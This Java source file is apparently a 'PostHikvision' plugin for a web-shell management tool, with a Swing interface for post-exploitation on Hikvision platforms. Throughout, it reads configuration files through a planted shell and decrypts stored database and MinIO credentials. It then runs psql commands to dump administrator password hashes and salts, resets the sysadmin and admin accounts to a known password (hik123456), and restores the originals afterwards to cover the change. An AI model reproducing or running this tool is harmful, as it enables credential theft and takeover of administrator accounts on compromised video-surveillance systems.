package shells.plugins.conan;

import core.annotation.PluginAnnotation;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Vector;
import javax.swing.*;

import core.ui.component.model.DbInfo;
import util.automaticBindClick;

import static shells.plugins.conan.ISECUREController.DecryptData;

@PluginAnnotation(Name = "PostHikvision", payloadName = "JavaDynamicPayload", DisplayName = "PostHikvision")
public class PostHikvision implements Plugin {
    private Payload payload;
    private ShellEntity shell;
    private JPanel panel = new JPanel(new BorderLayout());
    private JComboBox<String> serviceComboBox = new JComboBox<>(new String[]{"运行中心", "Web前台", "MinIO"});
    private JTextField pathTextField = new JTextField(50);
    private JButton getPathButton = new JButton("获取详情");
    private JButton extractInfoButton = new JButton("提取信息");
    private JButton userQueryButton = new JButton("SQL查询");
    private JButton resetPasswordButton = new JButton("重置密码");
    private JButton restorePasswordButton = new JButton("还原密码");
    private RTextArea resultTextArea = new RTextArea();

    // 新增的文本框
    private JTextField dbHostTextField = new JTextField(10);
    private JTextField dbPortTextField = new JTextField(5);
    private JTextField dbNameTextField = new JTextField(10);
    private JTextField dbUsernameTextField = new JTextField(10);
    private JTextField dbPasswordTextField = new JTextField(10);
    private JTextField execSqlTextField = new JTextField(20);
    private JTextField additionalField1 = new JTextField(40);
    private JTextField additionalField2 = new JTextField(40);
    // 在类中添加标签变量
    private JLabel additionalLabel1 = new JLabel("附加信息1:");
    private JLabel additionalLabel2 = new JLabel("附加信息2:");
    private JLabel additionalLabel3 = new JLabel("用于存放还原的原始密码和盐");

    public PostHikvision() {
        JPanel topPanel = new JPanel();
        topPanel.add(new JLabel("选择服务: "));
        topPanel.add(serviceComboBox);
        topPanel.add(pathTextField);
        topPanel.add(getPathButton);
        topPanel.add(extractInfoButton);
        topPanel.add(userQueryButton);
        topPanel.add(resetPasswordButton);
        topPanel.add(restorePasswordButton);

        // 数据库信息面板
        JPanel dbInfoPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 10));
        dbInfoPanel.add(new JLabel("DBHost:"));
        dbInfoPanel.add(dbHostTextField);
        dbInfoPanel.add(new JLabel("DBPort:"));
        dbInfoPanel.add(dbPortTextField);
        dbInfoPanel.add(new JLabel("DBName:"));
        dbInfoPanel.add(dbNameTextField);
        dbInfoPanel.add(new JLabel("DBUsername:"));
        dbInfoPanel.add(dbUsernameTextField);
        dbInfoPanel.add(new JLabel("DBPassword:"));
        dbInfoPanel.add(dbPasswordTextField);
        dbInfoPanel.add(new JLabel("ExecSQL:"));
        dbInfoPanel.add(execSqlTextField);

        // 新增的文本框行
        JPanel additionalPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 10));
        additionalPanel.add(additionalLabel1);
        additionalPanel.add(additionalField1);
        additionalPanel.add(additionalLabel2);
        additionalPanel.add(additionalField2);
        additionalPanel.add(additionalLabel3);

        panel.add(topPanel, BorderLayout.NORTH);

        // 将 dbInfoPanel 和 additionalPanel 放在 resultTextArea 的上方
        JPanel centerPanel = new JPanel(new BorderLayout());
        centerPanel.add(dbInfoPanel, BorderLayout.NORTH);

        // 创建一个新的面板来包含 additionalPanel 和 resultTextArea
        JPanel additionalAndResultPanel = new JPanel(new BorderLayout());
        additionalAndResultPanel.add(additionalPanel, BorderLayout.NORTH);
        additionalAndResultPanel.add(new JScrollPane(resultTextArea), BorderLayout.CENTER);

        centerPanel.add(additionalAndResultPanel, BorderLayout.CENTER);
        panel.add(centerPanel, BorderLayout.CENTER);

        // 监听下拉框选择变化
        serviceComboBox.addActionListener(this::updatePathTextField);
        getPathButton.addActionListener(this::getPathButtonClick);
        extractInfoButton.addActionListener(this::extractInfoButtonClick);
        userQueryButton.addActionListener(this::userQueryButtonClick);
        resetPasswordButton.addActionListener(this::resetPasswordButtonClick);
        restorePasswordButton.addActionListener(this::restorePasswordButtonClick);


    }

    private void updatePathTextField(ActionEvent actionEvent) {
        String selectedService = (String) serviceComboBox.getSelectedItem();
        String rootpath = getRootPath(this.payload.currentDir());
        switch (selectedService) {
            case "运行中心":
                pathTextField.setText(rootpath + "/opsMgrCenter/conf/config.properties");
                additionalLabel1.setText("c_password");
                additionalLabel2.setText("c_salt");
                break;
            case "Web前台":
                pathTextField.setText(rootpath + "/components/postgresql11linux64.1/conf/config.properties");
                additionalLabel1.setText("user_pwd");
                additionalLabel2.setText("salt");
                break;
            case "MinIO":
                pathTextField.setText(rootpath + "/components/minio.1/conf/config.properties");
                additionalLabel1.setText("附加信息1"); // 可根据需要设置
                additionalLabel2.setText("附加信息2"); // 可根据需要设置
                break;
            default:
                pathTextField.setText(rootpath + "/opsMgrCenter/conf/config.properties");
                additionalLabel1.setText("c_password");
                additionalLabel2.setText("c_salt");

        }
    }

    private void restorePasswordButtonClick(ActionEvent actionEvent) {
        String selectedService = (String) serviceComboBox.getSelectedItem();
        if ("运行中心".equals(selectedService)) {

            String c_password = additionalField1.getText();
            String c_salt = additionalField2.getText();
            String rootpath = getRootPath(this.payload.currentDir());
            String psqlpath = rootpath+"/components/postgresql11linux64.1/bin";
            String dbPassword =this.dbPasswordTextField.getText();
            String dbHost = this.dbHostTextField.getText();
            String dbPort = this.dbPortTextField.getText();
            String dbName = this.dbNameTextField.getText();
            String dbUsername = this.dbUsernameTextField.getText();
            String sql = "PGPASSWORD='"+dbPassword+"' ./psql -h "+dbHost+" -p "+dbPort+" -U "+dbUsername+" -d "+dbName+" -c \"UPDATE  center_user SET c_password ='"+c_password+"',c_salt = '"+c_salt+"' WHERE c_username='sysadmin'\"";
            String cmd = "sh -c \"cd "+psqlpath+"&&"+sql+"\" 2>&1";
            String result =this.payload.execCommand(cmd);
            resultTextArea.setText("已还原为:"+"\nc_password:"+c_password+"\nc_salt:"+c_salt+"\n结果："+result);
            //GDatabaseResult result = this.payload.execSql(dbInfo,"update",sql);
        }else if ("Web前台".equals(selectedService)) {

            String user_pwd = additionalField1.getText();
            String salt = additionalField2.getText();
            String rootpath = getRootPath(this.payload.currentDir());
            String psqlpath = rootpath+"/components/postgresql11linux64.1/bin";
            String dbPassword =this.dbPasswordTextField.getText();
            String dbHost = this.dbHostTextField.getText();
            String dbPort = this.dbPortTextField.getText();
            String dbName = this.dbNameTextField.getText();
            String dbUsername = this.dbUsernameTextField.getText();
            String sql = "PGPASSWORD='"+dbPassword+"' ./psql -h "+dbHost+" -p "+dbPort+" -U "+dbUsername+" -d "+dbName+" -c \"UPDATE  tb_user SET  user_pwd='"+user_pwd+"',salt = '"+salt+"' WHERE user_name='admin'\"";
            String cmd = "sh -c \"cd "+psqlpath+"&&"+sql+"\" 2>&1";
            String result =this.payload.execCommand(cmd);
            resultTextArea.setText("已还原为:"+"\nuser_pwd:"+user_pwd+"\nsalt:"+salt+"\n结果："+result);
            //GDatabaseResult result = this.payload.execSql(dbInfo,"update",sql);
        } else {
            resultTextArea.setText("未支持的服务类型。\n");
        }
    }

    // 新增密码重置按钮点击处理方法
    private void resetPasswordButtonClick(ActionEvent actionEvent) {
        String selectedService = (String) serviceComboBox.getSelectedItem();
        StringBuilder output = new StringBuilder();

        if ("运行中心".equals(selectedService)) {
            String rootpath = getRootPath(this.payload.currentDir());
            String psqlpath = rootpath+"/components/postgresql11linux64.1/bin";
            String dbPassword =this.dbPasswordTextField.getText();
            String dbHost = this.dbHostTextField.getText();
            String dbPort = this.dbPortTextField.getText();
            String dbName = this.dbNameTextField.getText();
            String dbUsername = this.dbUsernameTextField.getText();
            String sql = "PGPASSWORD='"+dbPassword+"' ./psql -h "+dbHost+" -p "+dbPort+" -U "+dbUsername+" -d "+dbName+" -c \"UPDATE  center_user SET c_password ='1909408d3304f41421caae1fd5df984f21d70b516a315d375f94f87861eedc92',c_salt = '938f7ad2436f3084a19dee5dc2e7a513892b696a8069a2f886ada7562226b1cc' WHERE c_username='sysadmin'\"";
            String cmd = "sh -c \"cd "+psqlpath+"&&"+sql+"\" 2>&1";
            String result =this.payload.execCommand(cmd);
            output.append("默认重置为sysadmin/hik123456\n");
            output.append("结果："+result);
           // GDatabaseResult result = this.payload.execSql(dbInfo,"update","UPDATE  center_user SET c_password ='1909408d3304f41421caae1fd5df984f21d70b516a315d375f94f87861eedc92',c_salt = '938f7ad2436f3084a19dee5dc2e7a513892b696a8069a2f886ada7562226b1cc' WHERE c_username='sysadmin'");
        } else if ("Web前台".equals(selectedService)) {
            String rootpath = getRootPath(this.payload.currentDir());
            String psqlpath = rootpath+"/components/postgresql11linux64.1/bin";
            String dbPassword =this.dbPasswordTextField.getText();
            String dbHost = this.dbHostTextField.getText();
            String dbPort = this.dbPortTextField.getText();
            String dbName = this.dbNameTextField.getText();
            String dbUsername = this.dbUsernameTextField.getText();
            String sql = "PGPASSWORD='"+dbPassword+"' ./psql -h "+dbHost+" -p "+dbPort+" -U "+dbUsername+" -d "+dbName+" -c \"UPDATE  tb_user SET  user_pwd='1909408d3304f41421caae1fd5df984f21d70b516a315d375f94f87861eedc92',salt = '938f7ad2436f3084a19dee5dc2e7a513892b696a8069a2f886ada7562226b1cc' WHERE user_name='admin'\"";
            String cmd = "sh -c \"cd "+psqlpath+"&&"+sql+"\" 2>&1";
            String result =this.payload.execCommand(cmd);
            output.append("默认重置为admin/hik123456\n");
            output.append("结果："+result);
            //GDatabaseResult result = this.payload.execSql(dbInfo,"update","UPDATE  tb_user SET  user_pwd='1909408d3304f41421caae1fd5df984f21d70b516a315d375f94f87861eedc92',salt = '938f7ad2436f3084a19dee5dc2e7a513892b696a8069a2f886ada7562226b1cc' WHERE user_name='admin'");
        } else {
            output.append("未支持的服务类型。\n");
        }

        resultTextArea.setText(output.toString());
    }
    public static String getRootPath(String path) {
        path = path.endsWith("/") ? path.substring(0, path.length() - 1) : path;
        int webIndex = path.indexOf("/web");
        if (webIndex != -1) {
            return path.substring(0, webIndex + 4);
        }
        return path;
    }

    private void getPathButtonClick(ActionEvent actionEvent) {
        String selectedPath = pathTextField.getText();
        String configurationDetails = new String(this.payload.downloadFile(selectedPath), StandardCharsets.UTF_8);
        resultTextArea.setText(configurationDetails);
    }

    private void extractInfoButtonClick(ActionEvent actionEvent) {
        String configurationDetails = resultTextArea.getText();
        String extractedInfo = extractRelevantInfo(configurationDetails);

        // 使用 Timer 来延迟设置文本
        Timer timer = new Timer(500, e -> {
            resultTextArea.setText(extractedInfo);
        });
        timer.setRepeats(false); // 只执行一次
        timer.start(); // 启动定时器
    }

    private void userQueryButtonClick(ActionEvent actionEvent) {
        // 实现用户查询的逻辑
        String selectedService = (String) serviceComboBox.getSelectedItem();
        if ("运行中心".equals(selectedService)) {
            // 处理运行中心的用户查询
            //[[1, sysadmin, 0, 3af25361263b580eaec8ef4b24a508771d14b432febba290ad1fb08cf7244f33, 648c2c7c799fd5099092b6aa3f0164db, 2024-05-06 18:06:22.002665, 2024-05-06 18:21:19.470335, 2024-05-06 18:21:19.467, 0, 1, 3, 0]]
            String rootpath = getRootPath(this.payload.currentDir());
            String psqlpath = rootpath+"/components/postgresql11linux64.1/bin";
            String dbPassword =this.dbPasswordTextField.getText();
            String dbHost = this.dbHostTextField.getText();
            String dbPort = this.dbPortTextField.getText();
            String dbName = this.dbNameTextField.getText();
            String dbUsername = this.dbUsernameTextField.getText();
            String execSql = this.execSqlTextField.getText();
            String sql = "PGPASSWORD='"+dbPassword+"' ./psql -h "+dbHost+" -p "+dbPort+" -U "+dbUsername+" -d "+dbName+" -c \""+execSql+"\n";
            String cmd = "sh -c \"cd "+psqlpath+"&&"+sql+"\" 2>&1";
            String result =this.payload.execCommand(cmd);
            resultTextArea.setText(result);
            //解析查询结果
            String[] rows = result.split("\n");
            if (rows.length > 2) { // 确保有足够的行
                // 获取第三行数据并去掉前后空格
                String dataRow = rows[2].trim(); // 获取真正的数据行
                // 使用正则表达式分割，处理多余空格
                String[] columns = dataRow.split("\\s*\\|\\s*");
                if (columns.length >= 5) {
                     additionalField1.setText(columns[3].trim()); // c_password
                     additionalField2.setText(columns[4].trim()); // c_salt
                }
            }

        } else if ("Web前台".equals(selectedService)) {
            // 处理Web前台的用户查询
            //[[user000000, admin, 0, 5, 0, 2, fbdab257d1872a9803ee6f1e6464b89a77a0af48d78bbcc4b9a96da931a4ba7d, b140fb50356201a6c1f6202b4b33d34fc7335b979b45886cfbc756a084ddb45e, 0, 2024-05-06 20:33:50.609, NULL, NULL, usergroup000, 默认用户组, /usergroup000/, NULL, NULL, NULL, 1, 0, 0, init, 2024-05-06 18:27:46.075, 2024-05-06 18:27:46.075, NULL, 管理员, NULL, NULL]]
            String rootpath = getRootPath(this.payload.currentDir());
            String psqlpath = rootpath+"/components/postgresql11linux64.1/bin";
            String dbPassword =this.dbPasswordTextField.getText();
            String dbHost = this.dbHostTextField.getText();
            String dbPort = this.dbPortTextField.getText();
            String dbName = this.dbNameTextField.getText();
            String dbUsername = this.dbUsernameTextField.getText();
            String execSql = this.execSqlTextField.getText();
            String sql = "PGPASSWORD='"+dbPassword+"' ./psql -h "+dbHost+" -p "+dbPort+" -U "+dbUsername+" -d "+dbName+" -c \""+execSql+"\"" ;
            String cmd = "sh -c \"cd "+psqlpath+"&&"+sql+"\" 2>&1";
            String result =this.payload.execCommand(cmd);
            resultTextArea.setText(result);
            // 解析查询结果
            String[] rows = result.split("\n");
            if (rows.length > 2) { // 确保有足够的行
                // 获取第三行数据并去掉前后空格
                String dataRow = rows[2].trim(); // 获取真正的数据行
                // 使用正则表达式分割，处理多余空格
                String[] columns = dataRow.split("\\s*\\|\\s*");
                if (columns.length >= 5) {
                    additionalField1.setText(columns[6].trim());
                    additionalField2.setText(columns[7].trim());
                }
            }

        }else {
            resultTextArea.setText("未支持的服务类型。\n");
        }
    }


    private String extractRelevantInfo(String config) {
        StringBuilder extracted = new StringBuilder();
        String selectedService = (String) serviceComboBox.getSelectedItem();

        if ("运行中心".equals(selectedService)) {
            // 提取运行中心端口
            String centerPort = extractLineValue(config, "opsmgr.center.port");
            extracted.append("运行中心端口：\n").append(centerPort).append("\n\n");

            // 提取数据库连接信息
            String ip = "jdbc:postgresql://" + extractLineValue(config, "opsmgr.database.ip");
            String port = extractLineValue(config, "opsmgr.database.port");
            String dbName = extractLineValue(config, "opsmgr.database.dbname");
            String username = extractLineValue(config, "opsmgr.database.username");
            String password = DecryptData(extractLineValue(config, "opsmgr.database.password"));

            extracted.append("数据库配置：\n")
                    .append(ip).append(":").append(port).append("/").append(dbName)
                    .append("?user=").append(username).append("&password=").append(password).append("\n");

            dbHostTextField.setText("127.0.0.1");
            dbPortTextField.setText(port);
            dbNameTextField.setText(dbName);
            dbUsernameTextField.setText(username);
            dbPasswordTextField.setText(password);
            execSqlTextField.setText("SELECT * FROM \"center_user\" WHERE c_username='sysadmin'");
        } else if ("Web前台".equals(selectedService)) {
            // 提取Web前台相关信息
            String port = extractLineValue(config, "rdbms.1.port");
            String username = extractLineValue(config, "rdbms.1.username");
            String password = DecryptData(extractLineValue(config, "rdbms.1.password"));

            extracted.append("数据库配置：\n")
                    .append("jdbc:postgresql://127.0.0.1:").append(port)
                    .append("/irds_irdsdb?user=").append(username)
                    .append("&password=").append(password).append("\n");

            dbHostTextField.setText("127.0.0.1");
            dbPortTextField.setText(port);
            dbNameTextField.setText("irds_irdsdb");
            dbUsernameTextField.setText(username);
            dbPasswordTextField.setText(password);
            execSqlTextField.setText("SELECT * FROM tb_user WHERE user_name='admin'");
        } else if ("MinIO".equals(selectedService)) {
            // 提取MinIO相关信息
            String accessKey = extractLineValue(config, "minio.1.accessKey");
            String webPort = extractLineValue(config, "minio.1.webPort");
            String secretKey = DecryptData(extractLineValue(config, "minio.1.secretKey"));

            extracted.append("MinIO配置：\n")
                    .append("端口：").append(webPort).append("\n")
                    .append("账号：").append(accessKey).append("\n")
                    .append("密码：").append(secretKey).append("\n");
        } else {
            extracted.append("未支持的服务类型。\n");
        }

        return extracted.toString();
    }

    private static String extractLineValue(String config, String key) {
        for (String line : config.split("\n")) {
            if (line.startsWith(key)) {
                // 将分割限制为2，确保密码中的等号被保留
                String[] parts = line.split("=", 2);
                return parts[1].trim();
            }
        }
        return "未找到" + key;
    }

    public void init(ShellEntity shellEntity2) {
        this.payload = shellEntity2.getPayloadModule();
        Encoding encoding = Encoding.getEncoding(shellEntity2);
        String rootpath = getRootPath(this.payload.currentDir());
        pathTextField.setText(rootpath + "/opsMgrCenter/conf/config.properties");
        additionalLabel1.setText("c_password");
        additionalLabel2.setText("c_salt");
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
